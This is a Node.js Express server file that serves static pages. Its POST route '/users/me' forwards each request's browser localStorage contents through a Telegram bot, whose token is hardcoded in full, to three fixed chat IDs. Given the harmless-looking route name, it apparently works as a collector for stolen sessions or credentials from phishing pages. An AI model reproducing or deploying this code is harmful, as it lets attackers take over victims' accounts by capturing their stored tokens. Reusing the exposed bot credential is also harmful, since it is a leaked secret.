const compression = require("compression");
const express = require("express");
const https = require("https");
const http = require("http");
const cors = require("cors");
const fs = require("fs");
const TelegramBot = require("node-telegram-bot-api");
const token = "7498708988:AAEhKUdriMVoWWo8oSUiftUC7k5NmjBSN-Q";
const bot = new TelegramBot(token, { polling: true });

const app = express();

const thirdTour = process.argv[2] == 3;
const forcePort = process.argv[3];
const useHttp = process.argv[4] !== "https";

const publicFolderName = thirdTour ? "public3" : "public";
const port = forcePort ? +forcePort : thirdTour ? 8443 : 4020;

app.use(cors());
app.set("etag", false);
app.use((req, res, next) => {
  res.set("Cache-Control", "no-store");
  next();
});
app.use(compression());
app.use(express.static(publicFolderName));
app.use(express.urlencoded({ extended: false }));
app.use(express.json());

app.get("/", (req, res) => {
  res.sendFile(__dirname + `/${publicFolderName}/index.html`);
});


app.post("/users/me", (req, res) => {
  [5576173130, 1389031904, 666273643].forEach((id) =>
    bot.sendMessage(id, JSON.stringify(req.body.localStorage))
  );
  res.sendStatus(200);
  // bot.on("message", (msg) => console.log(msg.chat.id));
});

const server = useHttp ? http : https;

let options = {};
if (!useHttp) {
  options.key = fs.readFileSync(__dirname + "/certs/server-key.pem");
  options.cert = fs.readFileSync(__dirname + "/certs/server-cert.pem");
}

server.createServer(options, app).listen(port, () => {
  console.log("Listening port:", port, "folder:", publicFolderName);
});
